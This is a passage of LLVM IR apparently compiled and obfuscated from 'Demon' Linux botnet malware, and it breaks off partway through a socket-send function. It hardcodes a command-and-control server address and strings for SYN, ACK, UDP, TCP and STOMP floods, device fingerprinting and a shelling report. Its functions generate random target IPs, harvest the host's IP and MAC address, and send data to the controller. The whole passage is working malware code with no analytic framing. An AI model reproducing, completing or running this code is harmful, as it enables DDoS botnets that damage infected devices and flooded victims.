; ModuleID = 'host/ir_sub/Demon.a.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.ifreq = type { %union.anon, %union.anon.0 }
%union.anon = type { [16 x i8] }
%union.anon.0 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon.1 }
%union.anon.1 = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.udphdr = type { %union.anon.3 }
%union.anon.3 = type { %struct.anon.4 }
%struct.anon.4 = type { i16, i16, i16, i16 }
%struct.anon.2 = type { i16, i16, i32, i32, i16, i16, i16, i16 }

@commServer = global [1 x i8*] [i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str, i32 0, i32 0)], align 8
@.str = private unnamed_addr constant [17 x i8] c"176.123.6.22:990\00", align 1
@mainCommSock = global i32 0, align 4
@currentServer = global i32 -1, align 4
@gotIP = global i32 0, align 4
@numpids = global i64 0, align 8
@macAddress = global [6 x i8] zeroinitializer, align 1
@ourIP = common global %struct.in_addr zeroinitializer, align 4
@pids = common global i32* null, align 8
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.1 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.2 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.3 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.41 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@.str.4 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.5 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.6 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.7 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.8 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.9 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.10 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.11 = private unnamed_addr constant [159 x i8] c"4E/x31/x6B/x4B/x31/x20/x21/x73/x69/x20/x4D/x33/x75/x79/x20/x4C/x30/x56/x72/x33/x20/x3C/x33/x20/x50/x61/x32/x72/x43/x48/x20/x4D/x32/x20/x41/x34/x34/x72/x43/x4B\00", align 1
@.str.12 = private unnamed_addr constant [356 x i8] c"lXfYi\18fYC7TFaCq5Hv982wuIiKbHlgFA0jEsW2OFQStO7x6zN9dBgayyWgvbk0L3lZClzJCmFG3GVNDFc2iTHNYy7gss8dHboBdeKE1VcblH1AxrVyiqokw2RYFvd4cd1QxyaHawwP6go9feBeHdlvMRDLbEbty3Py8yVT3UTjy3ZKONXmMNvURTUZTkeH37XT9H5JwH0vKB1Yw2rSYkTwcTvx6OltSIlahFg92uCRbLM8amh8GaGGGRw56iNUTGLgi395vj9ZVVeP01k7Tvq3NRvxo########!!!!!!!!!!!!!!!@!@!@$!%@&$^!@%%^!@%*!(@%&*(!@%&!@*(%&!@()%*!@%))\00", align 1
@.str.13 = private unnamed_addr constant [193 x i8] c"/x6f/x58/x22/x2e/x04/x92/x04/xa4/x42/x94/xb4/xf4/x44/xf4/x94/xd2/x04/xb4/xc4/xd2/x05/x84/xb4/xa4/xa6/xb3/x24/xd4/xb4/xf4/xa5/x74/xf4/x42/x04/x94/xf2/x24/xf5/x02/x03/xc4/x45/x04/xf5/x14/x44/x23\00", align 1
@.str.14 = private unnamed_addr constant [60 x i8] c"xmiwdio MOQWI\22K (**(D8u9289d2892e9 NIOWJDiojwioWAJM DKLAM) \00", align 1
@.str.15 = private unnamed_addr constant [193 x i8] c"/x48/x39/x32/x29/x53/x54/x49/x6c/x65/x20/x29/x5f/x51/x20/x49/x53/x4e/x22/x20/x4b/x58/x4d/x3c/x20/x4f/x53/x51/x22/x4f/x50/x20/x50/x41/x43/x4b/x45/x54/x20/xc2/xa3/x52/x4f/x4d/x57/x44/x4b/x4c/x57\00", align 1
@.str.16 = private unnamed_addr constant [7 x i8] c"x86_64\00", align 1
@.str.17 = private unnamed_addr constant [16 x i8] c"/usr/bin/python\00", align 1
@.str.18 = private unnamed_addr constant [14 x i8] c"Python Device\00", align 1
@.str.19 = private unnamed_addr constant [14 x i8] c"/usr/bin/perl\00", align 1
@.str.20 = private unnamed_addr constant [12 x i8] c"Perl Device\00", align 1
@.str.21 = private unnamed_addr constant [18 x i8] c"/usr/sbin/telnetd\00", align 1
@.str.22 = private unnamed_addr constant [14 x i8] c"Telnet Device\00", align 1
@.str.23 = private unnamed_addr constant [8 x i8] c"Unknown\00", align 1
@.str.24 = private unnamed_addr constant [3 x i8] c"22\00", align 1
@.str.25 = private unnamed_addr constant [3 x i8] c"23\00", align 1
@.str.26 = private unnamed_addr constant [18 x i8] c"/etc/apt/apt.conf\00", align 1
@.str.27 = private unnamed_addr constant [20 x i8] c"Debian Based Device\00", align 1
@.str.28 = private unnamed_addr constant [14 x i8] c"/etc/yum.conf\00", align 1
@.str.29 = private unnamed_addr constant [18 x i8] c"REHL Based Device\00", align 1
@.str.30 = private unnamed_addr constant [11 x i8] c"Unknown OS\00", align 1
@.str.31 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.32 = private unnamed_addr constant [4 x i8] c"STD\00", align 1
@.str.33 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.34 = private unnamed_addr constant [45 x i8] c"Sending TCP Packets To: %s:%d for %d seconds\00", align 1
@.str.35 = private unnamed_addr constant [6 x i8] c"STOMP\00", align 1
@.str.36 = private unnamed_addr constant [4 x i8] c"CNC\00", align 1
@.str.37 = private unnamed_addr constant [5 x i8] c"STOP\00", align 1
@.str.38 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.39 = private unnamed_addr constant [46 x i8] c"[Shelling]-->[%s]-->[%s]-->[%s]-->[%s]-->[%s]\00", align 1
@.str.40 = private unnamed_addr constant [2 x i8] c" \00", align 1

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = sub i32 0, %5
  %7 = sub i32 0, -1640531527
  %8 = add i32 %6, %7
  %9 = sub i32 0, %8
  %10 = add i32 %5, -1640531527
  store i32 %9, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %11 = load i32, i32* %2, align 4
  %12 = sub i32 0, %11
  %13 = sub i32 0, -1640531527
  %14 = add i32 %12, %13
  %15 = sub i32 0, %14
  %16 = add i32 %11, -1640531527
  %17 = add i32 %15, -695575732
  %18 = add i32 %17, -1640531527
  %19 = sub i32 %18, -695575732
  %20 = add i32 %15, -1640531527
  store i32 %19, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  br label %21

; <label>:21:                                     ; preds = %73, %1
  %22 = load i32, i32* %3, align 4
  %23 = icmp slt i32 %22, 4096
  br i1 %23, label %24, label %79

; <label>:24:                                     ; preds = %21
  %25 = load i32, i32* %3, align 4
  %26 = add i32 %25, -1626163883
  %27 = sub i32 %26, 3
  %28 = sub i32 %27, -1626163883
  %29 = sub nsw i32 %25, 3
  %30 = sext i32 %28 to i64
  %31 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %30
  %32 = load i32, i32* %31, align 4
  %33 = load i32, i32* %3, align 4
  %34 = sub i32 %33, 902830219
  %35 = sub i32 %34, 2
  %36 = add i32 %35, 902830219
  %37 = sub nsw i32 %33, 2
  %38 = sext i32 %36 to i64
  %39 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %38
  %40 = load i32, i32* %39, align 4
  %41 = xor i32 %32, -1
  %42 = and i32 1088798056, %41
  %43 = xor i32 1088798056, -1
  %44 = and i32 %32, %43
  %45 = xor i32 %40, -1
  %46 = and i32 %45, 1088798056
  %47 = and i32 %40, %43
  %48 = or i32 %42, %44
  %49 = or i32 %46, %47
  %50 = xor i32 %48, %49
  %51 = xor i32 %32, %40
  %52 = xor i32 %50, -1
  %53 = and i32 -833256513, %52
  %54 = xor i32 -833256513, -1
  %55 = and i32 %50, %54
  %56 = xor i32 -1640531527, -1
  %57 = and i32 %56, -833256513
  %58 = and i32 -1640531527, %54
  %59 = or i32 %53, %55
  %60 = or i32 %57, %58
  %61 = xor i32 %59, %60
  %62 = xor i32 %50, -1640531527
  %63 = load i32, i32* %3, align 4
  %64 = xor i32 %61, -1
  %65 = and i32 %63, %64
  %66 = xor i32 %63, -1
  %67 = and i32 %61, %66
  %68 = or i32 %65, %67
  %69 = xor i32 %61, %63
  %70 = load i32, i32* %3, align 4
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %71
  store i32 %68, i32* %72, align 4
  br label %73

; <label>:73:                                     ; preds = %24
  %74 = load i32, i32* %3, align 4
  %75 = add i32 %74, -1359289711
  %76 = add i32 %75, 1
  %77 = sub i32 %76, -1359289711
  %78 = add nsw i32 %74, 1
  store i32 %77, i32* %3, align 4
  br label %21

; <label>:79:                                     ; preds = %21
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = sub i32 0, 1
  %7 = sub i32 %5, %6
  %8 = add i32 %5, 1
  %9 = xor i32 %7, -1
  %10 = xor i32 4095, -1
  %11 = xor i32 1981192540, -1
  %12 = or i32 %9, %10
  %13 = or i32 1981192540, %11
  %14 = xor i32 %12, -1
  %15 = and i32 %14, %13
  %16 = and i32 %7, 4095
  store i32 %15, i32* @rand_cmwc.i, align 4
  %17 = load i64, i64* %2, align 8
  %18 = load i32, i32* @rand_cmwc.i, align 4
  %19 = zext i32 %18 to i64
  %20 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %19
  %21 = load i32, i32* %20, align 4
  %22 = zext i32 %21 to i64
  %23 = mul i64 %17, %22
  %24 = load i32, i32* @c, align 4
  %25 = zext i32 %24 to i64
  %26 = sub i64 0, %23
  %27 = sub i64 0, %25
  %28 = add i64 %26, %27
  %29 = sub i64 0, %28
  %30 = add i64 %23, %25
  store i64 %29, i64* %1, align 8
  %31 = load i64, i64* %1, align 8
  %32 = lshr i64 %31, 32
  %33 = trunc i64 %32 to i32
  store i32 %33, i32* @c, align 4
  %34 = load i64, i64* %1, align 8
  %35 = load i32, i32* @c, align 4
  %36 = zext i32 %35 to i64
  %37 = sub i64 0, %36
  %38 = sub i64 %34, %37
  %39 = add i64 %34, %36
  %40 = trunc i64 %38 to i32
  store i32 %40, i32* %3, align 4
  %41 = load i32, i32* %3, align 4
  %42 = load i32, i32* @c, align 4
  %43 = icmp ult i32 %41, %42
  br i1 %43, label %44, label %56

; <label>:44:                                     ; preds = %0
  %45 = load i32, i32* %3, align 4
  %46 = sub i32 0, %45
  %47 = sub i32 0, 1
  %48 = add i32 %46, %47
  %49 = sub i32 0, %48
  %50 = add i32 %45, 1
  store i32 %49, i32* %3, align 4
  %51 = load i32, i32* @c, align 4
  %52 = sub i32 %51, -888958183
  %53 = add i32 %52, 1
  %54 = add i32 %53, -888958183
  %55 = add i32 %51, 1
  store i32 %54, i32* @c, align 4
  br label %56

; <label>:56:                                     ; preds = %44, %0
  %57 = load i32, i32* %4, align 4
  %58 = load i32, i32* %3, align 4
  %59 = sub i32 0, %58
  %60 = add i32 %57, %59
  %61 = sub i32 %57, %58
  %62 = load i32, i32* @rand_cmwc.i, align 4
  %63 = zext i32 %62 to i64
  %64 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %63
  store i32 %60, i32* %64, align 4
  ret i32 %60
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomIP(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 %4) #9
  %6 = load i32, i32* %2, align 4
  %7 = xor i32 %6, -1
  %8 = xor i32 %5, %7
  %9 = and i32 %8, %5
  %10 = and i32 %5, %6
  store i32 %9, i32* %3, align 4
  %11 = load i32, i32* %3, align 4
  %12 = call i32 @rand_cmwc()
  %13 = load i32, i32* %2, align 4
  %14 = xor i32 %13, -1
  %15 = and i32 -1, %14
  %16 = xor i32 -1, -1
  %17 = and i32 %13, %16
  %18 = or i32 %15, %17
  %19 = xor i32 %13, -1
  %20 = xor i32 %18, -1
  %21 = xor i32 %12, %20
  %22 = and i32 %21, %12
  %23 = and i32 %12, %18
  %24 = xor i32 %11, -1
  %25 = and i32 %22, %24
  %26 = xor i32 %22, -1
  %27 = and i32 %11, %26
  %28 = or i32 %25, %27
  %29 = xor i32 %11, %22
  ret i32 %28
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #1

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 1, i32* %7, align 4
  store i32 0, i32* %8, align 4
  br label %9

; <label>:9:                                      ; preds = %27, %3
  %10 = load i32, i32* %7, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %25

; <label>:12:                                     ; preds = %9
  %13 = load i32, i32* %8, align 4
  %14 = load i32, i32* %5, align 4
  %15 = icmp slt i32 %13, %14
  br i1 %15, label %16, label %25

; <label>:16:                                     ; preds = %12
  %17 = load i8*, i8** %4, align 8
  %18 = load i32, i32* %8, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = getelementptr inbounds i8, i8* %20, i64 -1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 10
  br label %25

; <label>:25:                                     ; preds = %16, %12, %9
  %26 = phi i1 [ false, %12 ], [ false, %9 ], [ %24, %16 ]
  br i1 %26, label %27, label %40

; <label>:27:                                     ; preds = %25
  %28 = load i32, i32* %6, align 4
  %29 = load i8*, i8** %4, align 8
  %30 = load i32, i32* %8, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i8, i8* %29, i64 %31
  %33 = call i64 @read(i32 %28, i8* %32, i64 1)
  %34 = trunc i64 %33 to i32
  store i32 %34, i32* %7, align 4
  %35 = load i32, i32* %8, align 4
  %36 = add i32 %35, 1074879389
  %37 = add i32 %36, 1
  %38 = sub i32 %37, 1074879389
  %39 = add nsw i32 %35, 1
  store i32 %38, i32* %8, align 4
  br label %9

; <label>:40:                                     ; preds = %25
  %41 = load i32, i32* %7, align 4
  %42 = icmp eq i32 %41, 0
  br i1 %42, label %43, label %44

; <label>:43:                                     ; preds = %40
  br label %46

; <label>:44:                                     ; preds = %40
  %45 = load i8*, i8** %4, align 8
  br label %46

; <label>:46:                                     ; preds = %44, %43
  %47 = phi i8* [ null, %43 ], [ %45, %44 ]
  ret i8* %47
}

declare i64 @read(i32, i8*, i64) #2

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [4096 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca %struct.ifreq, align 8
  %12 = call i32 @socket(i32 2, i32 2, i32 0) #6
  store i32 %12, i32* %2, align 4
  %13 = load i32, i32* %2, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %0
  store i32 0, i32* %1, align 4
  br label %103

; <label>:16:                                     ; preds = %0
  %17 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %17, i8 0, i64 16, i32 4, i1 false)
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %18, align 4
  %19 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i32 0, i32 0)) #6
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %21 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %20, i32 0, i32 0
  store i32 %19, i32* %21, align 4
  %22 = call zeroext i16 @htons(i16 zeroext 53) #9
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %22, i16* %23, align 2
  %24 = load i32, i32* %2, align 4
  %25 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %26 = call i32 @connect(i32 %24, %struct.sockaddr* %25, i32 16)
  store i32 %26, i32* %4, align 4
  %27 = load i32, i32* %4, align 4
  %28 = icmp eq i32 %27, -1
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %16
  store i32 0, i32* %1, align 4
  br label %103

; <label>:30:                                     ; preds = %16
  store i32 16, i32* %6, align 4
  %31 = load i32, i32* %2, align 4
  %32 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %33 = call i32 @getsockname(i32 %31, %struct.sockaddr* %32, i32* %6) #6
  store i32 %33, i32* %4, align 4
  %34 = load i32, i32* %4, align 4
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %30
  store i32 0, i32* %1, align 4
  br label %103

; <label>:37:                                     ; preds = %30
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 2
  %39 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %38, i32 0, i32 0
  %40 = load i32, i32* %39, align 4
  store i32 %40, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %41 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.2, i32 0, i32 0), i32 0)
  store i32 %41, i32* %7, align 4
  br label %42

; <label>:42:                                     ; preds = %63, %37
  %43 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %44 = load i32, i32* %7, align 4
  %45 = call i8* @fdgets(i8* %43, i32 4096, i32 %44)
  %46 = icmp ne i8* %45, null
  br i1 %46, label %47, label %65

; <label>:47:                                     ; preds = %42
  %48 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %49 = call i8* @strstr(i8* %48, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.3, i32 0, i32 0)) #10
  %50 = icmp ne i8* %49, null
  br i1 %50, label %51, label %63

; <label>:51:                                     ; preds = %47
  %52 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  store i8* %52, i8** %9, align 8
  br label %53

; <label>:53:                                     ; preds = %58, %51
  %54 = load i8*, i8** %9, align 8
  %55 = load i8, i8* %54, align 1
  %56 = zext i8 %55 to i32
  %57 = icmp ne i32 %56, 9
  br i1 %57, label %58, label %61

; <label>:58:                                     ; preds = %53
  %59 = load i8*, i8** %9, align 8
  %60 = getelementptr inbounds i8, i8* %59, i32 1
  store i8* %60, i8** %9, align 8
  br label %53

; <label>:61:                                     ; preds = %53
  %62 = load i8*, i8** %9, align 8
  store i8 0, i8* %62, align 1
  br label %65

; <label>:63:                                     ; preds = %47
  %64 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %64, i8 0, i64 4096, i32 16, i1 false)
  br label %42

; <label>:65:                                     ; preds = %61, %42
  %66 = load i32, i32* %7, align 4
  %67 = call i32 @close(i32 %66)
  %68 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %69 = load i8, i8* %68, align 16
  %70 = icmp ne i8 %69, 0
  br i1 %70, label %71, label %100

; <label>:71:                                     ; preds = %65
  %72 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 0
  %73 = bitcast %union.anon* %72 to [16 x i8]*
  %74 = getelementptr inbounds [16 x i8], [16 x i8]* %73, i32 0, i32 0
  %75 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %76 = call i8* @strcpy(i8* %74, i8* %75) #6
  %77 = load i32, i32* %2, align 4
  %78 = call i32 (i32, i64, ...) @ioctl(i32 %77, i64 35111, %struct.ifreq* %11) #6
  store i32 0, i32* %10, align 4
  br label %79

; <label>:79:                                     ; preds = %94, %71
  %80 = load i32, i32* %10, align 4
  %81 = icmp slt i32 %80, 6
  br i1 %81, label %82, label %99

; <label>:82:                                     ; preds = %79
  %83 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 1
  %84 = bitcast %union.anon.0* %83 to %struct.sockaddr*
  %85 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %84, i32 0, i32 1
  %86 = getelementptr inbounds [14 x i8], [14 x i8]* %85, i32 0, i32 0
  %87 = load i32, i32* %10, align 4
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds i8, i8* %86, i64 %88
  %90 = load i8, i8* %89, align 1
  %91 = load i32, i32* %10, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %92
  store i8 %90, i8* %93, align 1
  br label %94

; <label>:94:                                     ; preds = %82
  %95 = load i32, i32* %10, align 4
  %96 = sub i32 0, 1
  %97 = sub i32 %95, %96
  %98 = add nsw i32 %95, 1
  store i32 %97, i32* %10, align 4
  br label %79

; <label>:99:                                     ; preds = %79
  br label %100

; <label>:100:                                    ; preds = %99, %65
  %101 = load i32, i32* %2, align 4
  %102 = call i32 @close(i32 %101)
  br label %103

; <label>:103:                                    ; preds = %100, %36, %29, %15
  %104 = load i32, i32* %1, align 4
  ret i32 %104
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #3

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #4

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #1

declare i32 @connect(i32, %struct.sockaddr*, i32) #2

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) #3

declare i32 @open(i8*, i32, ...) #2

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #5

declare i32 @close(i32) #2

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #3

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) #3

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #10
  %8 = sub i64 0, 1
  %9 = add i64 %7, %8
  %10 = sub i64 %7, 1
  %11 = trunc i64 %9 to i32
  store i32 %11, i32* %5, align 4
  br label %12

; <label>:12:                                     ; preds = %21, %1
  %13 = load i8*, i8** %2, align 8
  %14 = load i32, i32* %4, align 4
  %15 = sext i32 %14 to i64
  %16 = getelementptr inbounds i8, i8* %13, i64 %15
  %17 = load i8, i8* %16, align 1
  %18 = sext i8 %17 to i32
  %19 = call i32 @isspace(i32 %18) #10
  %20 = icmp ne i32 %19, 0
  br i1 %20, label %21, label %27

; <label>:21:                                     ; preds = %12
  %22 = load i32, i32* %4, align 4
  %23 = sub i32 %22, 187849644
  %24 = add i32 %23, 1
  %25 = add i32 %24, 187849644
  %26 = add nsw i32 %22, 1
  store i32 %25, i32* %4, align 4
  br label %12

; <label>:27:                                     ; preds = %12
  br label %28

; <label>:28:                                     ; preds = %43, %27
  %29 = load i32, i32* %5, align 4
  %30 = load i32, i32* %4, align 4
  %31 = icmp sge i32 %29, %30
  br i1 %31, label %32, label %41

; <label>:32:                                     ; preds = %28
  %33 = load i8*, i8** %2, align 8
  %34 = load i32, i32* %5, align 4
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds i8, i8* %33, i64 %35
  %37 = load i8, i8* %36, align 1
  %38 = sext i8 %37 to i32
  %39 = call i32 @isspace(i32 %38) #10
  %40 = icmp ne i32 %39, 0
  br label %41

; <label>:41:                                     ; preds = %32, %28
  %42 = phi i1 [ false, %28 ], [ %40, %32 ]
  br i1 %42, label %43, label %48

; <label>:43:                                     ; preds = %41
  %44 = load i32, i32* %5, align 4
  %45 = sub i32 0, -1
  %46 = sub i32 %44, %45
  %47 = add nsw i32 %44, -1
  store i32 %46, i32* %5, align 4
  br label %28

; <label>:48:                                     ; preds = %41
  %49 = load i32, i32* %4, align 4
  store i32 %49, i32* %3, align 4
  br label %50

; <label>:50:                                     ; preds = %69, %48
  %51 = load i32, i32* %3, align 4
  %52 = load i32, i32* %5, align 4
  %53 = icmp sle i32 %51, %52
  br i1 %53, label %54, label %74

; <label>:54:                                     ; preds = %50
  %55 = load i8*, i8** %2, align 8
  %56 = load i32, i32* %3, align 4
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i8, i8* %55, i64 %57
  %59 = load i8, i8* %58, align 1
  %60 = load i8*, i8** %2, align 8
  %61 = load i32, i32* %3, align 4
  %62 = load i32, i32* %4, align 4
  %63 = add i32 %61, 1213109962
  %64 = sub i32 %63, %62
  %65 = sub i32 %64, 1213109962
  %66 = sub nsw i32 %61, %62
  %67 = sext i32 %65 to i64
  %68 = getelementptr inbounds i8, i8* %60, i64 %67
  store i8 %59, i8* %68, align 1
  br label %69

; <label>:69:                                     ; preds = %54
  %70 = load i32, i32* %3, align 4
  %71 = sub i32 0, 1
  %72 = sub i32 %70, %71
  %73 = add nsw i32 %70, 1
  store i32 %72, i32* %3, align 4
  br label %50

; <label>:74:                                     ; preds = %50
  %75 = load i8*, i8** %2, align 8
  %76 = load i32, i32* %3, align 4
  %77 = load i32, i32* %4, align 4
  %78 = sub i32 0, %77
  %79 = add i32 %76, %78
  %80 = sub nsw i32 %76, %77
  %81 = sext i32 %79 to i64
  %82 = getelementptr inbounds i8, i8* %75, i64 %81
  store i8 0, i8* %82, align 1
  ret void
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #5

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #5

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias i8* @malloc(i64 2048) #6
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 2048, i32 1, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %16 = call i32 @print(i8** %5, i8* %14, %struct.__va_list_tag* %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* %20) #10
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i32, i32* %3, align 4
  %24 = load i8*, i8** %6, align 8
  %25 = load i8*, i8** %6, align 8
  %26 = call i64 @strlen(i8* %25) #10
  %27 = call i64 @send(i32 %23, i8* %24, i64 %26, i32 16384)
  %28 = trunc i64 %27 to i32
  store i32 %28, i32* %8, align 4
